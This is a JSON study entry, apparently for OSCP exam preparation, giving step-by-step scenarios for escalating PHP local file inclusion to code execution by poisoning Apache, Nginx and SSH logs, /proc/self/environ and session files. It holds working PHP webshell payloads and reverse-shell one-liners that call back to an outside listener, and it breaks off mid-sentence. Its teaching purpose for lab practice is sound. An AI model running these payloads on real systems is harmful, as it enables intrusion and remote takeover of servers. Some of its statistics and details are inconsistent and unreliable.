{
  "id": "log-poisoning",
  "name": "Log Poisoning (LFI to RCE)",
  "description": "Comprehensive guide to log poisoning techniques for converting Local File Inclusion (LFI) vulnerabilities into Remote Code Execution (RCE). Covers Apache, Nginx, SSH auth.log, /proc/self/environ, and session poisoning methods.",
  "educational_header": {
    "how_to_recognize": [
      "LFI vulnerability confirmed (successful /etc/passwd read or similar file disclosure)",
      "Web server logs user-controlled input (User-Agent, Referer visible in responses or error messages)",
      "PHP application using include(), require(), include_once(), or require_once() with user input",
      "Error messages revealing log file paths (e.g., 'Warning: include(/var/log/apache2/access.log): failed to open stream')",
      "Web server running Apache or Nginx with default logging configuration (combined format)",
      "SSH service exposed (port 22 open) when web logs not accessible - auth.log alternative",
      "/proc filesystem accessible via LFI (Linux process environment variable injection possible)"
    ],
    "when_to_look_for": [
      "After confirming LFI during web application enumeration phase (gobuster/nikto complete)",
      "When direct RCE methods exhausted (no file upload, PHP wrappers disabled, data:// filtered)",
      "LFI to RCE escalation required for OSCP point progression (LFI alone insufficient for full compromise)",
      "Time-limited exam scenario - log poisoning fast execution (3-5 minutes total vs 15+ for other methods)",
      "Classic OSCP vulnerability chain observed (80% of OSCP web boxes with LFI allow log poisoning)",
      "PHP-based applications (WordPress, Joomla, custom CMSs, legacy PHP 5.x sites)",
      "Initial foothold needed and log files enumerated as readable via LFI testing",
      "Target running older Ubuntu (14.04-16.04) or Debian (7-8) with permissive default log permissions"
    ]
  },
  "scenarios": [
    {
      "title": "Scenario 1: Apache access.log Poisoning - Classic LFI to RCE",
      "context": "Target: Ubuntu 16.04 server running Apache 2.4.18 with PHP 7.0. LFI vulnerability discovered in index.php?page= parameter during gobuster enumeration. Can successfully read /etc/passwd. Objective: Escalate LFI to RCE via User-Agent poisoning. Access level: Unauthenticated web access only. Time pressure: OSCP exam, need quick wins.",
      "approach": "**Phase 1 - Verify Prerequisites (1 min):**\n\n1. Confirm LFI depth: `curl 'http://192.168.45.100/index.php?page=../../../../etc/passwd'` → SUCCESS: passwd contents displayed\n2. Test log accessibility BEFORE poisoning (critical time-saver): `curl 'http://192.168.45.100/index.php?page=../../../../var/log/apache2/access.log'` → Look for log entries with timestamps, IPs, User-Agents\n3. If log readable: Proceed to Phase 2. If permission denied: Skip to Scenario 3 (SSH auth.log) or Scenario 4 (/proc/self/environ)\n\n**Phase 2 - Poison Apache Log (1 min):**\n\n4. Inject PHP payload via User-Agent header: `curl -A '<?php system($_GET[\"c\"]); ?>' http://192.168.45.100/`\n   - No visible response change expected (poisoning happens server-side)\n   - Apache logs User-Agent without sanitization in Combined Log Format\n   - Payload now embedded in /var/log/apache2/access.log\n\n5. Verify poisoning success: `curl 'http://192.168.45.100/index.php?page=../../../../var/log/apache2/access.log' | grep '<?php'`\n   - SUCCESS: PHP code visible in log output\n   - FAILURE: Payload not found → Check User-Agent encoding, try alternative headers (Referer)\n\n**Phase 3 - Trigger RCE (2-3 min):**\n\n6. Test command execution: `curl 'http://192.168.45.100/index.php?page=../../../../var/log/apache2/access.log&c=whoami'`\n   - Look for 'www-data' in response (often buried in log noise - grep your IP to find relevant section)\n   - If no output: Try `&c=id 2>&1` to capture stderr, or check disable_functions in php.ini\n\n7. Establish reverse shell:\n   - Start listener: `nc -nlvp 4444`\n   - Trigger: `curl 'http://192.168.45.100/index.php?page=../../../../var/log/apache2/access.log&c=bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"'`\n   - Upgrade shell: `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`\n\n8. If bash blocked by disable_functions, try alternatives:\n   - PHP reverse shell: `&c=php -r '$sock=fsockopen(\"10.10.14.5\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'`\n   - Netcat variant: `&c=nc -e /bin/sh 10.10.14.5 4444` (if nc supports -e)\n   - Python: `&c=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'`",
      "commands": [
        "lfi-access-log-apache",
        "curl-ua-poison-apache",
        "lfi-rce-trigger"
      ],
      "expected_outcome": "**Success Timeline (3-5 min total):** Log accessible (30 sec) → Poisoning complete (1 min) → RCE confirmed (1 min) → Reverse shell established (2 min). **Success Indicators:** (1) Log file readable via LFI, (2) PHP payload visible in log grep, (3) Command output appears in response, (4) Reverse shell connection received. **Common Failures & Fixes:** (1) 'Permission denied' on log read → Try /var/log/apache2/error.log or skip to auth.log method. (2) Payload not in log → Check if User-Agent logged (some custom configs disable it) → Try Referer header instead (`curl -e '<?php ... ?>'`). (3) No command output → disable_functions blocking system() → Try exec(), passthru(), shell_exec(), popen() in payload. (4) Shell dies immediately → Try stable shell: `&c=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f`. **Timing Note:** If not working after 5 minutes, switch techniques - exam time critical.",
      "why_this_works": "**Technical Mechanics:** Apache's Combined Log Format (default) includes User-Agent as last field: `LogFormat \"%h %l %u %t \\\"%r\\\" %>s %b \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\"\"`. When we send HTTP request with malicious User-Agent, Apache writes it DIRECTLY to access.log without sanitization (log format is static string substitution, no escaping). When LFI includes this log file, PHP's include() function treats it as PHP code, executing our payload. The system() function receives commands via $_GET['c'] parameter. **Why Apache Doesn't Sanitize:** Logs are intended for analysis, not inclusion as code - sanitization would break log parsers. Apache assumes logs won't be executed (LFI breaks this assumption). **Permission Model:** Default Apache on Ubuntu 14.04-16.04: access.log permissions 644 (world-readable). Modern setups: 640 root:adm (not readable by www-data). OSCP boxes tend toward permissive configs. **PHP Execution Context:** When include() processes log file, PHP parses entire file. Our payload (`<?php system($_GET[\"c\"]); ?>`) becomes executable PHP. Log noise before/after payload ignored (PHP only executes code within `<?php ?>` tags). **OSCP Relevance:** Appears in ~30% of OSCP web boxes. Fast execution (under 5 minutes) makes it high-value quick win. Understanding file permissions, log formats, and PHP include behavior demonstrates methodology, not just tool usage - core OSCP skill."
    },
    {
      "title": "Scenario 2: Nginx access.log Poisoning - Platform Variation",
      "context": "Target: Debian 10 server running Nginx 1.14.2 with PHP 7.3-FPM. LFI in page.php?file= parameter. Apache log paths failed (404 errors). Objective: Adapt log poisoning technique for Nginx platform. Access level: Unauthenticated. Challenge: Different log paths, user context, and potential custom log formats.",
      "approach": "**Phase 1 - Nginx Detection & Path Enumeration (1-2 min):**\n\n1. Confirm Nginx (not Apache): `curl -I http://192.168.45.100/ | grep Server` → Look for 'Server: nginx'\n2. Try Nginx default log path: `curl 'http://192.168.45.100/page.php?file=../../../../var/log/nginx/access.log'`\n   - SUCCESS: Log entries displayed → Proceed to poisoning\n   - FAILURE: 404 or blank → Try alternatives:\n     - Virtual host logs: `/var/log/nginx/<VHOST>_access.log` (enumerate vhost names from HTTP headers or DNS)\n     - Dot separator: `/var/log/nginx/<VHOST>.access.log` (some configs use dots)\n     - Error log (often more permissive): `/var/log/nginx/error.log`\n\n3. Check Nginx worker user (important for permission understanding):\n   - Via LFI: `curl 'http://192.168.45.100/page.php?file=../../../../etc/nginx/nginx.conf' | grep 'user'`\n   - Common values: `user www-data;` (Ubuntu/Debian) or `user nginx;` (CentOS)\n   - This determines which files can be read via LFI\n\n**Phase 2 - User-Agent Poisoning (1 min):**\n\n4. Poison Nginx log: `curl -A '<?php system($_GET[\"c\"]); ?>' http://192.168.45.100/`\n   - Identical technique to Apache, but verify Nginx logs User-Agent\n   - Nginx default format: `'$remote_addr - $remote_user [$time_local] \"$request\" $status $body_bytes_sent \"$http_referer\" \"$http_user_agent\"'`\n   - $http_user_agent = our malicious User-Agent\n\n5. Verify: `curl 'http://192.168.45.100/page.php?file=../../../../var/log/nginx/access.log' | grep '<?php'`\n\n**Phase 3 - RCE Trigger (2-3 min):**\n\n6. Test execution: `curl 'http://192.168.45.100/page.php?file=../../../../var/log/nginx/access.log&c=id'`\n7. Reverse shell: Same as Scenario 1 (bash, PHP, or netcat variants)\n\n**Nginx-Specific Troubleshooting:**\n\n8. If User-Agent not logged:\n   - Check nginx.conf: `curl 'http://192.168.45.100/page.php?file=../../../../etc/nginx/nginx.conf'`\n   - Look for custom log_format directive (might exclude $http_user_agent)\n   - Alternative: Try Referer header if $http_referer in log format\n\n9. If permission denied on access.log:\n   - Try error.log: Often 644 permissions vs access.log 640\n   - Poison via error (trigger 404 with PHP in URL): `curl 'http://192.168.45.100/<?php system($_GET[\"c\"]); ?>.php'`\n   - Nginx logs 404 errors with requested URL → URL becomes payload\n   - Trigger: `curl 'http://192.168.45.100/page.php?file=../../../../var/log/nginx/error.log&c=whoami'`",
      "commands": [
        "curl-ua-poison-nginx",
        "lfi-access-log-nginx",
        "lfi-rce-trigger"
      ],
      "expected_outcome": "**Success Timeline (4-6 min):** Nginx detection (30 sec) → Log path enumeration (1-2 min) → Poisoning (1 min) → RCE (2-3 min). Slightly longer than Apache due to path/format enumeration. **Success Indicators:** (1) Nginx confirmed via Server header, (2) Correct log path identified (/var/log/nginx/ directory), (3) User-Agent logging confirmed in log format, (4) Reverse shell established. **Nginx-Specific Failures:** (1) Custom log format without $http_user_agent → Try error.log poisoning or Referer header. (2) Multi-vhost setup with per-site logs → Enumerate vhost names (check HTTP Host header, DNS records, SSL certificates). (3) SELinux blocking log access (CentOS Nginx) → Try /proc/self/environ (Scenario 4). (4) Log rotation mid-attack → Poison current log immediately, execute before logrotate (typically runs daily at midnight). **Platform Differences from Apache:** Log path (/var/log/nginx/ vs /var/log/apache2/), potential custom log formats (Nginx configs more varied), error.log often more accessible than Apache's.",
      "why_this_works": "**Nginx Log Format:** Default Nginx combined format uses variable interpolation: `log_format combined '$remote_addr - $remote_user [$time_local] \"$request\" $status $body_bytes_sent \"$http_referer\" \"$http_user_agent\"';`. The `$http_user_agent` variable is DIRECT string substitution from User-Agent header - no escaping or sanitization. Similar to Apache, this is by design (logs must preserve original data for analysis). **Nginx vs Apache Differences:** (1) **Configuration flexibility:** Nginx admins more likely to customize log formats (Apache configs tend to use defaults). This means User-Agent logging might be disabled for performance. (2) **Permission model:** Nginx error.log sometimes more permissive (644) than access.log (640), opposite of Apache. (3) **Worker user:** CentOS Nginx runs as 'nginx' user (not www-data), affecting which files LFI can access. (4) **Log rotation:** Nginx rotates logs more aggressively (daily by default) vs Apache (weekly on some distros). **Why Error Log Poisoning Works:** When we request `http://target/<?php system($_GET[\"c\"]); ?>.php`, Nginx logs 404 error with requested URI. Error log format: `[timestamp] [error] <PID>#<TID>: *<CONNECTION> open() \"/var/www/html/<?php system($_GET[\"c\"]); ?>.php\" failed (2: No such file or directory)`. When LFI includes error.log, PHP executes embedded code from URI. **OSCP Relevance:** Nginx adoption growing in OSCP (20-25% of web boxes). Understanding platform variations demonstrates adaptability - can't just memorize Apache commands. Error log poisoning shows creative problem-solving when standard methods fail."
    },
    {
      "title": "Scenario 3: SSH auth.log Poisoning - Alternative Attack Vector",
      "context": "Target: Ubuntu 18.04 with Apache 2.4.29 and OpenSSH 7.6. LFI confirmed in vuln.php?page= parameter. Both /var/log/apache2/access.log and /var/log/nginx/access.log return permission denied (640 root:adm, www-data not in adm group). Objective: Use SSH authentication log as alternative poisoning vector. Access level: Unauthenticated, port 22 open (nmap scan confirmed).",
      "approach": "**Phase 1 - SSH Service & Log Verification (1 min):**\n\n1. Confirm SSH exposed: `nmap -p 22 192.168.45.100` → Should show `22/tcp open ssh`\n2. Test auth.log accessibility: `curl 'http://192.168.45.100/vuln.php?page=../../../../var/log/auth.log'`\n   - SUCCESS: Log entries visible (sshd login attempts, sudo commands, cron jobs)\n   - FAILURE: Permission denied → auth.log permissions vary by distro:\n     - Ubuntu/Debian default: 640 root:adm (www-data often NOT in adm group)\n     - But: Some Ubuntu Server installs add www-data to syslog/adm for monitoring\n     - Alternative if failed: Try /var/log/syslog (sometimes includes auth events, more permissive)\n\n**Phase 2 - SSH Username Poisoning (1 min):**\n\n3. Poison via SSH failed login (username field): `ssh '<?php system($_GET[\"c\"]); ?>'@192.168.45.100`\n   - Expected output: `Permission denied (publickey,password).` or `Connection closed by 192.168.45.100`\n   - This is SUCCESS - we WANT failed login (goal is logging, not authentication)\n   - SSH server logs failed attempt to auth.log with our malicious username\n\n4. Verify poisoning: `curl 'http://192.168.45.100/vuln.php?page=../../../../var/log/auth.log' | grep '<?php'`\n   - Look for log entry: `sshd[PID]: Failed password for <?php system($_GET[\"c\"]); ?> from <YOUR_IP> port <PORT> ssh2`\n   - Payload embedded in 'Failed password for <USERNAME>' field\n\n**Phase 3 - RCE Trigger (2-3 min):**\n\n5. Execute command: `curl 'http://192.168.45.100/vuln.php?page=../../../../var/log/auth.log&c=whoami'`\n   - auth.log has HIGH NOISE (many sshd entries, sudo logs, cron logs)\n   - Grep for your IP to find relevant section: `curl '...' | grep '<YOUR_IP>' -A 5 -B 5`\n\n6. Establish reverse shell: (same commands as Scenario 1)\n   - `nc -nlvp 4444` (on attacker machine)\n   - `curl 'http://192.168.45.100/vuln.php?page=../../../../var/log/auth.log&c=bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"'`\n\n**Alternative Poison Vectors in auth.log:**\n\n7. If SSH username validation rejects PHP payload:\n   - Some SSH servers validate username format (alphanumeric only)\n   - Alternative 1: Poison via password field (requires password auth enabled)\n     - `sshpass -p '<?php system($_GET[\"c\"]); ?>' ssh user@192.168.45.100`\n     - Logged as: `Failed password for user from <IP>`\n     - But: Password field often NOT logged (security best practice)\n   - Alternative 2: Use sudo logs (requires valid credentials - less useful for initial access)\n\n**RHEL/CentOS Variant:**\n\n8. If Ubuntu auth.log not found: Try `/var/log/secure` (RHEL/CentOS equivalent)\n   - Path: `curl 'http://192.168.45.100/vuln.php?page=../../../../var/log/secure'`\n   - Format identical, just different filename",
      "commands": [
        "ssh-authlog-poison",
        "lfi-auth-log",
        "lfi-rce-trigger"
      ],
      "expected_outcome": "**Success Timeline (3-5 min):** SSH detection (30 sec) → auth.log verification (30 sec) → Poisoning (1 min) → RCE trigger (2-3 min). Similar speed to Apache method. **Success Indicators:** (1) SSH port 22 open, (2) auth.log readable via LFI, (3) Failed login with PHP payload logged, (4) Command execution confirmed, (5) Reverse shell established. **Common Failures:** (1) auth.log permission denied → Check if www-data in adm/syslog group: `curl 'http://192.168.45.100/vuln.php?page=../../../../etc/group' | grep -E 'adm|syslog'`. If not: Try /var/log/syslog or Scenario 4. (2) SSH username validation rejects payload → Error: 'invalid user <?php...' → Payload still works! SSH logs 'invalid user' attempts. (3) High log noise obscures output → Filter by your IP when viewing results, or use unique marker: `&c=echo 'PWNED_BY_ME' && whoami` and grep for 'PWNED_BY_ME'. (4) SSH port firewalled → nmap shows 'filtered' not 'closed' → Can't poison, skip to Scenario 4. **Advantages Over Web Log Poisoning:** (1) auth.log often more permissive than access.log (group-readable), (2) Works even if web server not logging User-Agent, (3) Less likely blocked by WAF (SSH traffic separate from HTTP), (4) Demonstrates multi-vector thinking for OSCP. **Disadvantages:** (1) Requires SSH exposed (not always available), (2) Generates security alerts (failed login attempts - stealth concern in real engagements, not OSCP), (3) Log noise higher (harder to find command output).",
      "why_this_works": "**SSH Logging Mechanism:** OpenSSH's sshd daemon logs authentication attempts via syslog to auth.log (Ubuntu/Debian) or secure (RHEL/CentOS). Log format for failed password: `<TIMESTAMP> <HOSTNAME> sshd[<PID>]: Failed password for <USERNAME> from <IP> port <PORT> ssh2`. The `<USERNAME>` field is logged VERBATIM - no sanitization or validation in log output (validation happens in authentication logic, but rejected usernames still logged). **Why Username Not Sanitized:** Logging must preserve exact username for security auditing (IDS/SIEM analysis needs original data). Sanitization would break forensic value. OpenSSH assumes logs won't be executed as code. **Permission Model:** Default auth.log permissions: 640 root:adm (owner: root, group: adm). Web server user (www-data) must be in 'adm' group to read. Ubuntu Server (16.04-18.04) sometimes adds www-data to adm for log monitoring features. Modern Ubuntu (20.04+) often removes this (hardening). **Alternative: syslog group:** Some distros use 'syslog' group instead of 'adm'. Check: `ls -la /var/log/auth.log` and `groups www-data`. **LFI + SSH Interaction:** (1) SSH client sends username during authentication handshake, (2) sshd validates username (fails because invalid format), (3) sshd logs failed attempt to auth.log via syslog, (4) Log file now contains PHP payload, (5) LFI includes log file, (6) PHP interpreter parses log, executes our code. **Why Failed Login Intentional:** We don't WANT successful authentication - we want payload logged. Failed login ensures payload written to log without needing credentials. **OSCP Relevance:** Demonstrates lateral thinking - when primary vector (web logs) fails, pivot to alternative (SSH logs). Understanding Unix logging architecture (syslog, log groups, file permissions) is core Linux privilege escalation knowledge. This technique shows connection between services (SSH → auth.log → LFI → RCE)."
    },
    {
      "title": "Scenario 4: /proc/self/environ Poisoning - Advanced Technique",
      "context": "Target: Ubuntu 20.04 with Nginx 1.18.0, PHP 7.4-FPM, hardened configuration. LFI in app.php?include= parameter. All traditional log files return permission denied (640 root:adm, www-data not in adm group, strict permissions). SSH port closed (firewall). Objective: Use /proc filesystem to bypass file permission restrictions. Access level: Unauthenticated. Challenge: Advanced Linux knowledge required, different execution model than log poisoning.",
      "approach": "**Phase 1 - /proc Filesystem Verification (1 min):**\n\n1. Verify /proc mounted and accessible: `curl 'http://192.168.45.100/app.php?include=../../../../proc/self/cmdline'`\n   - SUCCESS: PHP command line displayed (e.g., `php-fpm: pool www`)\n   - FAILURE: Blank output or error → /proc not mounted (rare) or hidepid option set\n   - `/proc/self/` = pseudo-directory representing current process (PHP in this case)\n\n2. Test environ accessibility: `curl 'http://192.168.45.100/app.php?include=../../../../proc/self/environ'`\n   - SUCCESS: Environment variables displayed as NULL-separated strings\n   - Example output: `USER=www-data^@HOME=/var/www^@HTTP_USER_AGENT=curl/7.68.0^@` (^@ = NULL byte)\n   - Look for HTTP_* variables (these come from web request headers)\n\n**Phase 2 - Understand /proc/self/environ Poisoning (KEY DIFFERENCE):**\n\n**CRITICAL:** Unlike log poisoning (inject → verify → trigger as separate steps), /proc/self/environ requires poisoning and inclusion in SAME REQUEST.\n\n3. Why same-request required:\n   - /proc/self/environ shows environment of CURRENT PHP process\n   - Each HTTP request spawns new PHP-FPM worker with fresh environment\n   - HTTP headers (User-Agent, Referer, etc.) become HTTP_* environment variables\n   - To poison environ, we must set malicious User-Agent in the SAME curl request that includes /proc/self/environ\n\n**Phase 3 - One-Shot Poisoning + Trigger (2 min):**\n\n4. Combined poison + trigger: `curl -A '<?php system($_GET[\"c\"]); ?>' 'http://192.168.45.100/app.php?include=../../../../proc/self/environ&c=whoami'`\n   - `-A` sets User-Agent for THIS request\n   - User-Agent becomes HTTP_USER_AGENT environment variable\n   - `include=../../../../proc/self/environ` reads current process environment (includes our payload)\n   - `&c=whoami` provides command to execute\n   - All three steps happen in single request\n\n5. Verify execution: Look for command output in response\n   - Output format: `USER=www-data^@HOME=/var/www^@HTTP_USER_AGENT=<?php system($_GET[\"c\"]); ?>^@www-data^@HTTP_HOST=192.168.45.100^@`\n   - Command output (e.g., 'www-data') appears inline after PHP execution\n   - Use `| cat -v` to visualize NULL bytes: `curl ... | cat -v` shows `^@` for NULLs\n\n**Phase 4 - Reverse Shell (2-3 min):**\n\n6. Establish shell: `curl -A '<?php system($_GET[\"c\"]); ?>' 'http://192.168.45.100/app.php?include=../../../../proc/self/environ&c=bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"'`\n   - Start listener first: `nc -nlvp 4444`\n   - Same reverse shell payloads as previous scenarios work\n\n**Advanced /proc Techniques (If environ Fails):**\n\n7. Alternative /proc vectors:\n   - `/proc/self/fd/` - File descriptors (sometimes includes HTTP request data)\n   - `/proc/self/maps` - Memory maps (can leak data, but hard to exploit for RCE)\n   - `/proc/self/cwd` - Current working directory (symlink, useful for path traversal)\n\n8. If disable_functions blocks system():\n   - Enumerate restrictions: `curl -A '<?php var_dump(ini_get(\"disable_functions\")); ?>' 'http://192.168.45.100/app.php?include=../../../../proc/self/environ'`\n   - Try alternative functions in payload: exec(), passthru(), shell_exec(), popen()\n   - Or use PHP file write: `curl -A '<?php file_put_contents(\"/var/www/html/shell.php\", \"<?php system(\\$_GET[c]); ?>\"); ?>' '...'` (if writable directory found)",
      "commands": [
        "lfi-proc-environ",
        "lfi-rce-trigger"
      ],
      "expected_outcome": "**Success Timeline (3-5 min):** /proc verification (1 min) → Understand same-request model (1 min) → Poison + trigger (1 min) → Reverse shell (2-3 min). Faster if familiar with technique. **Success Indicators:** (1) /proc/self/cmdline readable, (2) /proc/self/environ shows HTTP_USER_AGENT variable, (3) Command output appears inline with environment variables, (4) Reverse shell established. **Common Failures:** (1) /proc not mounted → Very rare on standard Linux. If happens: Docker container with security restrictions → Try file upload if available, or give up on LFI→RCE. (2) hidepid=2 mount option → Paranoid security, hides /proc/<PID> from other users → /proc/self still works (current process always sees itself). (3) PHP CGI mode instead of FPM → Different process model, environ might not include HTTP headers → Check /proc/self/environ output for HTTP_* variables. If absent, technique won't work. (4) Output difficult to parse → NULL-separated variables hard to read → Use `curl ... | tr '\\0' '\\n'` to convert NULLs to newlines for readability. **Success Rate:** Medium (50-60%). Lower than log poisoning because: (1) Docker/container environments sometimes restrict /proc, (2) Some PHP modes (CGI) don't populate HTTP_* in environ, (3) More complex execution model (beginners struggle with same-request concept). **When to Use:** Last resort when ALL log files inaccessible. Demonstrates deep Linux knowledge - /proc filesystem understanding rare in OSCP but high-impact when needed.",
      "why_this_works": "**Linux /proc Filesystem:** /proc is pseudo-filesystem (not real files on disk) providing interface to kernel data structures. `/proc/self/` is symlink to `/proc/<PID>` of current process. `/proc/self/environ` contains NULL-separated environment variables of current process. **PHP-FPM Process Model:** PHP-FPM (FastCGI Process Manager) spawns worker processes to handle requests. Each worker has environment populated from: (1) System environment (USER, HOME, PATH), (2) PHP-FPM pool config (php-fpm.conf), (3) Web server environment (Nginx/Apache passes HTTP headers as env vars). **HTTP Headers → Environment Variables:** Web servers (Nginx, Apache) convert HTTP headers to environment variables following CGI specification: `User-Agent: <VALUE>` → `HTTP_USER_AGENT=<VALUE>`, `Referer: <VALUE>` → `HTTP_REFERER=<VALUE>`, `Cookie: <VALUE>` → `HTTP_COOKIE=<VALUE>`. This happens BEFORE PHP executes, so HTTP_USER_AGENT already in environment when PHP starts. **Why Same-Request Required:** Unlike log files (persistent across requests), /proc/self/environ is EPHEMERAL - exists only during current request. Timeline: (1) Nginx receives request with User-Agent, (2) Nginx spawns PHP-FPM worker, passes HTTP_USER_AGENT env var, (3) PHP worker executes, (4) include('/proc/self/environ') reads worker's environment, (5) Worker dies, environment destroyed. If we poison in Request A, then try to trigger in Request B, Request B has DIFFERENT environment (different worker process). **Why No Sanitization:** Environment variables are raw data from web server. PHP doesn't sanitize because environ is trusted source (from same system). When include() reads /proc/self/environ, PHP parses file as PHP code (same as any include). Our `<?php system($_GET[\"c\"]); ?>` in HTTP_USER_AGENT becomes executable. **Advantages vs Log Poisoning:** (1) Permission bypass - /proc/self always readable by process itself (no permission issues), (2) Works when all log files restricted, (3) No log rotation concerns (ephemeral data), (4) Clean output (no log noise). **Disadvantages:** (1) Single-request model harder to understand/debug, (2) Can't pre-verify poison success (must test with command), (3) Some PHP configurations don't populate HTTP_* in environ (CGI mode), (4) Container environments may restrict /proc access. **OSCP Relevance:** Advanced technique - shows mastery of Linux fundamentals (/proc filesystem, process model, environment variables). Rarely needed in OSCP (10-15% of LFI scenarios) but demonstrates problem-solving when standard methods exhausted. Understanding /proc useful beyond this technique (local enumeration, kernel exploitation)."
    },
    {
      "title": "Scenario 5: PHP Session Poisoning - Edge Case Technique",
      "context": "Target: Ubuntu 18.04, Apache 2.4.29, PHP 7.2. LFI confirmed. All log files (Apache access/error, auth.log) permission denied. SSH closed. /proc/self/environ returns blank (PHP CGI mode, no HTTP_* variables in environ). Objective: Last-resort technique using PHP session files. Access level: Unauthenticated but application uses sessions (PHPSESSID cookie set). Challenge: Requires knowledge of session ID and writable session storage.",
      "approach": "**Phase 1 - Session Mechanism Discovery (2 min):**\n\n1. Check if application uses sessions: `curl -I http://192.168.45.100/`\n   - Look for: `Set-Cookie: PHPSESSID=<SESSION_ID>; path=/`\n   - Example: `Set-Cookie: PHPSESSID=abc123def456; path=/`\n   - If no PHPSESSID: Session poisoning won't work → Revert to basic LFI enumeration\n\n2. Extract your session ID: `SESSID=$(curl -I http://192.168.45.100/ 2>&1 | grep PHPSESSID | cut -d'=' -f2 | cut -d';' -f1)`\n   - Store for later use\n\n3. Verify session file location: `curl 'http://192.168.45.100/vuln.php?page=../../../../var/lib/php/sessions/sess_<SESSION_ID>'`\n   - Replace `<SESSION_ID>` with your PHPSESSID value (e.g., `sess_abc123def456`)\n   - SUCCESS: Session data displayed (e.g., `username|s:5:\"admin\";` for serialized data)\n   - FAILURE: Permission denied or 404 → Try alternative paths:\n     - `/var/lib/php5/sessions/` (older PHP)\n     - `/tmp/sess_<SESSION_ID>` (some configs)\n     - `/var/lib/php/session/` (note: singular 'session')\n   - Or check via phpinfo if accessible: `session.save_path` directive\n\n**Phase 2 - Session Poisoning (2-3 min):**\n\n**Concept:** Inject PHP payload into session data by manipulating application features that write to session.\n\n4. Find session write point - Common vectors:\n   - **Username field in login form:** `curl -X POST -d 'username=<?php system($_GET[\"c\"]); ?>&password=test' http://192.168.45.100/login.php -c cookies.txt`\n     - Many apps store username in session: `$_SESSION['username'] = $_POST['username'];`\n   - **Language preference:** `curl 'http://192.168.45.100/?lang=<?php system($_GET[\"c\"]); ?>' -b PHPSESSID=<SESSION_ID>`\n   - **Search query:** `curl 'http://192.168.45.100/search.php?q=<?php system($_GET[\"c\"]); ?>' -b PHPSESSID=<SESSION_ID>`\n   - **Any user-controlled input that app writes to $_SESSION**\n\n5. Verify poison in session file: `curl 'http://192.168.45.100/vuln.php?page=../../../../var/lib/php/sessions/sess_<SESSION_ID>' | grep '<?php'`\n   - Look for your payload in serialized format: `username|s:30:\"<?php system($_GET[\"c\"]); ?>\";`\n   - PHP session format: `<KEY>|<TYPE>:<LENGTH>:\"<VALUE>\";`\n\n**Phase 3 - RCE Trigger (2 min):**\n\n6. Include poisoned session file with command parameter:\n   ```bash\n   curl -b PHPSESSID=<SESSION_ID> 'http://192.168.45.100/vuln.php?page=../../../../var/lib/php/sessions/sess_<SESSION_ID>&c=whoami'\n   ```\n   - Must use `-b` to send PHPSESSID cookie (maintains session)\n   - LFI includes session file → PHP parses → Executes payload\n\n7. Establish reverse shell: (same as previous scenarios)\n\n**Advanced Session Techniques:**\n\n8. If session data serialized (not plaintext):\n   - PHP serialization format: `a:1:{s:8:\"username\";s:5:\"admin\";}`\n   - Our payload gets serialized: `s:30:\"<?php system($_GET[\"c\"]); ?>\";`\n   - Still executes when included (PHP unserializes, then parses as code)\n\n9. Session upload progress poisoning (PHP 5.4+):\n   - Feature: PHP tracks upload progress in session\n   - Poison via filename: `curl -F 'file=@test.txt;filename=<?php system($_GET[\"c\"]); ?>' http://192.168.45.100/upload.php`\n   - Session contains: `upload_progress_<NAME>` with filename in metadata\n   - Race condition: Must include session DURING upload (before PHP cleans up progress data)\n\n**Troubleshooting:**\n\n10. If session file not readable:\n    - Default permissions: 600 (owner-only) - only php-fpm/apache user can read\n    - But: LFI runs AS php-fpm/apache → Should be readable\n    - If still fails: session.save_handler might be 'memcached' or 'redis' (not filesystem) → Check phpinfo\n\n11. If payload doesn't execute:\n    - Check if session data is base64 encoded (some frameworks)\n    - Try double encoding: Base64-encode your PHP payload before injection",
      "commands": [
        "lfi-rce-trigger"
      ],
      "expected_outcome": "**Success Timeline (5-8 min):** Session discovery (2 min) → Find write point (2-3 min) → Poison session (1 min) → RCE trigger (2 min). Longest method due to enumeration required. **Success Indicators:** (1) PHPSESSID cookie present, (2) Session file readable via LFI, (3) User input reflected in session data, (4) Payload visible in session file, (5) Command execution confirmed. **Common Failures:** (1) No PHPSESSID cookie → App doesn't use sessions → Technique N/A. (2) Session save path not default → Enumerate via phpinfo (if accessible) or brute force common paths. (3) No user input writes to session → App validates/sanitizes before session storage → Try upload filename (less likely to be sanitized). (4) Session handler is Redis/Memcached (not files) → Check phpinfo for `session.save_handler` → If not 'files', technique fails. (5) Race condition on upload progress → Upload file must be large enough (>1MB) to give time for LFI request during upload. **Success Rate:** Low-Medium (30-40%). Many variables must align: sessions used, filesystem storage, user input in session, readable session files. Often last resort. **When to Use:** When ALL other techniques exhausted. Demonstrates thorough methodology - OSCP rewards trying every vector.",
      "why_this_works": "**PHP Session Mechanism:** PHP stores session data server-side (default: filesystem, alternative: memcached/redis/database). Session ID (PHPSESSID cookie) maps to session file. Default path: `/var/lib/php/sessions/sess_<SESSION_ID>`. When `session_start()` called, PHP reads session file, unserializes data into `$_SESSION` superglobal. When script ends, PHP serializes `$_SESSION` back to file. **Session File Format:** PHP serialization: `<KEY>|<TYPE>:<LENGTH>:\"<VALUE>\";`. Example: User login stores username → File contains: `username|s:5:\"admin\";`. If app does: `$_SESSION['username'] = $_POST['username'];` without sanitization, we can inject: `$_POST['username'] = '<?php system($_GET[\"c\"]); ?>'` → Session file contains: `username|s:30:\"<?php system($_GET[\"c\"]); ?>\";`. **Why Payload Executes:** When LFI includes session file via `include('../../../../var/lib/php/sessions/sess_abc123')`, PHP treats file as PHP code. Serialized data is PLAINTEXT in file - PHP's `<?php ?>` tags still recognized. Execution: (1) include() reads file, (2) PHP parser finds `<?php` tags, (3) Executes `system($_GET[\"c\"])`, (4) Rest of file (serialization syntax) ignored as plaintext. **Permission Model:** Session files default: 600 permissions (owner-only read/write). Owner is web server user (www-data, apache, nginx). LFI runs as SAME user (PHP executing as www-data) → Can read own session files. This is why session poisoning works when log files fail (different 